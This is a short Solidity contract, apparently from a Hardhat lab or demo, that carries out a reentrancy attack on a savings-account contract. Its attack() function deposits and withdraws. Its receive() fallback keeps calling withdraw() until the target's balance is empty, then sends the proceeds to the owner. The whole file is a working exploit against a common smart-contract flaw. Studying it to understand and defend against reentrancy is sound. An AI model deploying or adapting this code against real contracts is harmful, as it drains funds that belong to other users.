// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingsAccountV2 {
  function deposit() external payable;

  function withdraw() external;
}

contract InvestorV2 is Ownable {
  ISavingsAccountV2 public immutable savingsAccountV2;

  constructor(address savingsAccountV2ContractAddress) {
    savingsAccountV2 = ISavingsAccountV2(savingsAccountV2ContractAddress);
  }

  function attack() external payable onlyOwner {
    savingsAccountV2.deposit{ value: msg.value }();
    savingsAccountV2.withdraw();
  }

  receive() external payable {
    if (address(savingsAccountV2).balance > 0) {
      console.log("");
      console.log("Reentring...");
      savingsAccountV2.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}
